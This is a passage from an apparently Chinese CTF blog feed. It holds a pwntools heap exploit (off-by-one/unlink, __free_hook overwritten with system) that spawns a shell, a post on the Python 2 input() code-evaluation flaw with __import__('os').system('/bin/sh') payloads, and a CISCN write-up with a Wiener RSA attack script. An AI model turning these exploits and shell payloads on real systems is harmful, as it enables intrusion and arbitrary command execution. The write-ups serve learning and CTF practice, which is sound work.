class="keyword">def</span> <span class="title">remove</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, desc</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span>(<span class="params">name</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;skye&quot;</span>.ljust(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;skye&quot;</span>.ljust(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">first_heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;first_heap:&quot;</span>+<span class="built_in">hex</span>(first_heap))</span><br><span class="line">heap_base = first_heap - <span class="number">0x1080</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0x20</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>,<span class="number">0x20</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;g&#x27;</span>*<span class="number">8</span>,<span class="number">0x208</span>,<span class="string">&#x27;h&#x27;</span>*<span class="number">8</span>)<span class="comment">#4 0x218</span></span><br><span class="line"><span class="comment"># make sure chunk5size low bit is 01,or corruption (!prev)</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;i&#x27;</span>*<span class="number">8</span>,<span class="number">0x200</span>-<span class="number">0x10</span>,<span class="string">&#x27;j&#x27;</span>*<span class="number">8</span>)<span class="comment">#5 0x200</span></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0x200</span>,<span class="string">&#x27;k&#x27;</span>*<span class="number">8</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">ptr = heap_base + <span class="number">0x1180</span><span class="comment"># target addr</span></span><br><span class="line">log.info(<span class="string">&quot;ptr:&quot;</span>+<span class="built_in">hex</span>(ptr))</span><br><span class="line"><span class="comment"># fake chunk(0x200 2 chunk5)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x201</span>)+ p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>) </span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x1e0</span>+p64(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x202018)&quot;)</span></span><br><span class="line">remove(<span class="number">5</span>)<span class="comment"># unlink *ptr = ptr-0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FD-&gt;chunk4 desc fd </span></span><br><span class="line"><span class="comment"># BK-&gt;chunk6 struct desc</span></span><br><span class="line">payload = p64(<span class="number">0x31</span>)+p64(<span class="number">0x4</span>)+p64(heap_base+<span class="number">0x11e0</span>)+p64(heap_base+<span class="number">0x10c0</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">main_area = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;main_area:&quot;</span>+<span class="built_in">hex</span>(main_area))</span><br><span class="line">libc_base = main_area - <span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li><p>off-by-one 思路中通过申请一个非常大的 chunk ，让程序通过 mmap 分配内存，该内存地址与 libc 有固定偏移</p></li><li><p>程序自动分配的[第一个堆](# 在Ubuntu16下出现情况)，在师兄提醒下大概是因为程序没有初始化缓冲区，程序会自动申请一个堆用作缓存区。</p></li><li><p>现代 unlink</p><ul><li><p>满足检查条件：</p><p><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></p><p><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></p></li><li><p>实现效果：</p><p><code>*P = P - 8</code></p><p><code>*P = P - 12</code></p><p>P 的指针指向了比自己低 12 的地址处</p></li></ul></li><li><p>prev_size 是前一个 chunk 的大小（含 chunk head），简单计算方法：上一个 chunk 指针减去 next chunk 指针的值。</p></li><li><p>unlink 思路中计算错了 chunk 大小，触发了 <code>double free or corruption (!prev)</code> 。最后查证是因为被释放 chunk size 被修改错误，导致找不到 next chunk 的 prev_inuse 信息而导致报错<code>没有找到 chunk 的标志信息</code></p></li><li><p><code>RELRO:    Full RELRO</code> 程序不能修改 got 表，我们就去修改 __malloc_hook、__free_hook 等 hook 函数，具体原理可以看源码，<strong>在进入 malloc 或者 free 会先去查对应的 hook 函数是否不会空，如果不为空则去执行 hook 指向的函数</strong>。</p><ul><li>malloc 的参数是 int ，所以改 malloc 相关函数一般改为 onegadget</li><li>free 的参数是 地址，所以改 free 相关函数可以改为 onegadget 或者 system 然后传入 <code>/bin/sh</code> 字符串的地址</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆溢出 </tag>
            
            <tag> off_by_one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python2中input()函数漏洞</title>
      <link href="archives/c5d6b07d/"/>
      <url>archives/c5d6b07d/</url>
      
        <content type="html"><![CDATA[<h2 id="函数简介"><a href="#函数简介" class="headerlink" title="函数简介"></a>函数简介</h2><p><strong>input()函数是python中的内置函数,函数作用是从stdin中读取数据</strong></p><h2 id="input-与-raw-input-区别"><a href="#input-与-raw-input-区别" class="headerlink" title="input() 与 raw_input() 区别"></a>input() 与 raw_input() 区别</h2><p>python2 两个常见输入函数：input 和 raw_input 。</p><p>raw_input() 会将输入的内容转换为字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a1 = raw_input(<span class="string">&quot;字符串:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a1)</span><br><span class="line"></span><br><span class="line">a2 = raw_input(<span class="string">&quot;数字:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a2)</span><br><span class="line"></span><br><span class="line">a3 = raw_input(<span class="string">&quot;变量名:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a3)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">$ python 1.py</span></span><br><span class="line"><span class="string">字符串:skye</span></span><br><span class="line"><span class="string">&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">数字:2311</span></span><br><span class="line"><span class="string">&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">变量名:a3</span></span><br><span class="line"><span class="string">&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>input() 能自动识别出输入的类型，将输入内容转换为对应类型（str、int、float）。这里我们先尝试输入正常无误的例子，注意字符串的输入方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a1 = <span class="built_in">input</span>(<span class="string">&quot;字符串:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a1)</span><br><span class="line"></span><br><span class="line">a2 = <span class="built_in">input</span>(<span class="string">&quot;数字:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(a2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">$ python 1.py</span></span><br><span class="line"><span class="string">字符串:&quot;skye&quot;</span></span><br><span class="line"><span class="string">&lt;type &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">数字:2311</span></span><br><span class="line"><span class="string">&lt;type &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="input-产生漏洞原因"><a href="#input-产生漏洞原因" class="headerlink" title="input() 产生漏洞原因"></a>input() 产生漏洞原因</h2><p>函数会将 stdin 输入的内容当做是 python2 代码去执行，看两个例子：</p><ol><li><p>```python<br>a = raw_input()<br>b = input()<br>print “raw_input:”+a<br>print “input:”+b<br>‘’’<br>$ python 1.py<br>3+2<br>3+2<br>raw_input:%d 3+2<br>input:%d 5<br>‘’’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   input 输入的内容被当做是 python 代码去执行了。</span><br><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;python</span><br><span class="line">   #!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">   # -*- coding: utf-8 -*-</span><br><span class="line">   ans &#x3D; 10</span><br><span class="line">   a &#x3D; raw_input()</span><br><span class="line">   if a &#x3D;&#x3D; ans:</span><br><span class="line">   print &quot;raw_input&quot;</span><br><span class="line">   b &#x3D; input()</span><br><span class="line">   if b &#x3D;&#x3D; ans:</span><br><span class="line">   print &quot;input&quot;</span><br><span class="line">   &#39;&#39;&#39;</span><br><span class="line">   $ python 1.py</span><br><span class="line">   ans</span><br><span class="line">   ans</span><br><span class="line">   input</span><br><span class="line">   &#39;&#39;&#39;</span><br></pre></td></tr></table></figure><p>input 输入 ans 直接读取了 ans 的值到 b 当中，实际效果等同于<code>b = ans</code>。在这里也知道了为什么用 input() 输入字符串时，要加上引号，如果我们不加上，很可能被当做是<strong>变量名</strong>，结果就如同例子 2 。</p></li></ol><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul><li>如果 python 脚本本身就有引入 os 库，输入 payload 直接 getshell：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>如果 python 脚本没有引入 os 库，payload 如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>python2 中避免使用 input() 函数，使用 raw_input() 代替，如果需要 int 可以这样：<code>int(raw_input())</code> 。</p><p>python3 中 input() 输入默认转换为字符型，raw_input() 被去除。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.51cto.com/12332766/2299894">Python中input()函数漏洞及与raw_input（）函数区别</a></li><li><a href="http://www.prog61.com/2020/03/29/input%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9Epython/">input()函数中的漏洞– Python 2.x</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 CISCN Writeup</title>
      <link href="archives/205/"/>
      <url>archives/205/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="babyjsk"><a href="#babyjsk" class="headerlink" title="babyjsk"></a>babyjsk</h2><p>解压后在众多文件夹中的找到 <code>server.py</code> 。内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2中input()函数漏洞</span></span><br><span class="line">size = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">assert</span>(size &lt; <span class="number">1024</span>*<span class="number">1024</span>) <span class="comment">#1MB max</span></span><br><span class="line">script = sys.stdin.read(size) <span class="comment"># reads one byte at a time, similar to getchar()</span></span><br><span class="line"></span><br><span class="line">temp = tempfile.mktemp()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(temp, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(script)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.environ[&#x27;LD_PRELOAD&#x27;] = &quot;./libJavaScriptCore.so.1&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;LD_PRELOAD=/home/ctf/libJavaScriptCore.so.1 /home/ctf/jsc &quot;</span> + temp</span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.mrskye.cn/archives/187">Python2中input()函数漏洞笔记</a></p></blockquote><p>脚本引入了 os 库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h2><p>仅知道 n e c ，但是 e 非常大，正常都是 65535 ，判断是低解密指数攻击。用现成轮子：<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d-<span class="number">1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=-<span class="number">1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">n1=<span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">c=<span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">e=<span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">d=decode(e,n1)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+]&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(m)</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>这题其实跟逆向关系不大，会用z3库就解出来了，相当于去解一个46元一次方程组，人手算肯定算到天亮，那么用z3这个解方程库一下自就可以跑出来了</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>z3 库的使用另外开了<a href="https://www.mrskye.cn/archives/185/">笔记</a>记录，简单记录这个脚本思路。首先变量类型不一定要 BitVec ，可以是 Int ， 因为解出来的值必须是整数，不然怎么从 ascii 转成可见字符串；然后是 89 行开始的约束是限制结尾在 ascii 可见字符范围内，测试后发现不添加这部分也是可以解出来的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">de = [<span class="number">0x4F17</span>,<span class="number">0x9CF6</span>,<span class="number">0x8DDB</span>,<span class="number">0x8EA6</span>,<span class="number">0x6929</span>,<span class="number">0x9911</span>,<span class="number">0x40A2</span>,<span class="number">0x2F3E</span>,<span class="number">0x62B6</span>,<span class="number">0x4B82</span>,<span class="number">0x486C</span>,<span class="number">0x4002</span>,<span class="number">0x52D7</span>,<span class="number">0x2DEF</span>,<span class="number">0x28DC</span>,<span class="number">0x640D</span>,<span class="number">0x528F</span>,<span class="number">0x613B</span>,<span class="number">0x4781</span>,<span class="number">0x6B17</span>,<span class="number">0x3237</span>,<span class="number">0x2A93</span>,<span class="number">0x615F</span>,<span class="number">0x50BE</span>,<span class="number">0x598E</span>,<span class="number">0x4656</span>,<span class="number">0x5B31</span>,<span class="number">0x313A</span>,<span class="number">0x3010</span>,<span class="number">0x67FE</span>,<span class="number">0x4D5F</span>,<span class="number">0x58DB</span>,<span class="number">0x3799</span>,<span class="number">0x60A0</span>,<span class="number">0x2750</span>,<span class="number">0x3759</span>,<span class="number">0x8953</span>,<span class="number">0x7122</span>,<span class="number">0x81F9</span>,<span class="number">0x5524</span>,<span class="number">0x8971</span>,<span class="number">0x3A1D</span>]</span><br><span class="line">v46=BitVec(<span class="string">&#x27;v46&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v47=BitVec(<span class="string">&#x27;v47&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v48=BitVec(<span class="string">&#x27;v48&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v49=BitVec(<span class="string">&#x27;v49&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v50=BitVec(<span class="string">&#x27;v50&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v51=BitVec(<span class="string">&#x27;v51&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v52=BitVec(<span class="string">&#x27;v52&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v53=BitVec(<span class="string">&#x27;v53&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v54=BitVec(<span class="string">&#x27;v54&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v55=BitVec(<span class="string">&#x27;v55&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v56=BitVec(<span class="string">&#x27;v56&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v57=BitVec(<span class="string">&#x27;v57&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v58=BitVec(<span class="string">&#x27;v58&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v59=BitVec(<span class="string">&#x27;v59&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v60=BitVec(<span class="string">&#x27;v60&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v61=BitVec(<span class="string">&#x27;v61&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v62=BitVec(<span class="string">&#x27;v62&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v63=BitVec(<span class="string">&#x27;v63&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v64=BitVec(<span class="string">&#x27;v64&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v65=BitVec(<span class="string">&#x27;v65&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v66=BitVec(<span class="string">&#x27;v66&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v67=BitVec(<span class="string">&#x27;v67&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v68=BitVec(<span class="string">&#x27;v68&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v69=BitVec(<span class="string">&#x27;v69&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v70=BitVec(<span class="string">&#x27;v70&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v71=BitVec(<span class="string">&#x27;v71&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v72=BitVec(<span class="string">&#x27;v72&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v73=BitVec(<span class="string">&#x27;v73&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v74=BitVec(<span class="string">&#x27;v74&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v75=BitVec(<span 